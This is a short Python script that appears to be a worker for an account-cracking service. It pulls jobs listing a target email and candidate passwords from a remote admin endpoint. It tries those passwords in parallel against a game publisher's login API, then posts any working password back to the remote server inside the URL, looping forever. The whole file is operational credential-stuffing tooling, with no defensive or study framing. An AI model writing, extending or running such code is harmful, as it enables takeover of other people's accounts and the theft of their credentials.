import pickle
import time

import requests
import concurrent.futures

from pydantic import BaseModel


class Job(BaseModel):
    job_id: str
    email: str
    job_completed: bool
    job_in_progress: bool
    file_index: int
    password_found: str


def get_jobs() -> list[Job]:
    auth_code = "sdasdasdas"
    url = f"https://last-shelter.vip/admin/_tool/get-jobs/{auth_code}"

    response = requests.get(url=url)
    print(response.text)
    return [Job(**_job) for _job in response.json().get('job_list', [])] if response.ok else []


def get_files(job_id: str):
    url = f"https://last-shelter.vip/admin/_tool/get-job/{job_id}"
    response = requests.get(url=url)
    if response.ok:
        return response.json()


def game_account_valid(password: str, email: str) -> tuple[bool, str]:
    """
    Validate Game Accounts
    :param email: Email of the account
    :param password: Password of the account
    :return: True if the login is successful, False otherwise
    """
    _account_verification_endpoint: str = "https://lsaccount.im30.net/common/v1/login"
    form_data = {'email': email, 'pass': password}
    response = requests.post(url=_account_verification_endpoint, data=form_data)
    if response.ok:
        response_data = response.json()
        return response_data.get('code') == 10000, password
    return False, password


def validate_passwords(passwords: dict[str, str], email: str) -> tuple[bool, str | None]:
    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
        # Validate passwords concurrently
        futures = {executor.submit(game_account_valid, password, email): password for password in passwords.values()}
        for future in concurrent.futures.as_completed(futures):

            try:
                is_found, password = future.result()
                if is_found:
                    return is_found, password
            except Exception as e:
                print(f"An error occurred: {e}")
    return False, None


def update_backend(password: str, job_id: str):
    """

    :param password:
    :param job_id:
    :return:
    """
    url = f"https://last-shelter.vip/admin/_tool/updates/{job_id}/{password}"
    response = requests.post(url=url)
    return response.ok


if __name__ == "__main__":

    while True:
        for job in get_jobs():
            if job.job_in_progress and not job.job_completed:
                job_data = get_files(job_id=job.job_id)
                email = job_data.get('job', {}).get('email', None)
                passwords = job_data.get('passwords')
                job_id = job_data.get('job', {}).get('job_id', None)
                print(job_data)
                if not job_id:
                    continue
                # Call validate_passwords with the initial batch
                is_found, password = validate_passwords(passwords=passwords, email=email)

                if is_found:
                    update_backend(password=password, job_id=job_id)

        time.sleep(50000)
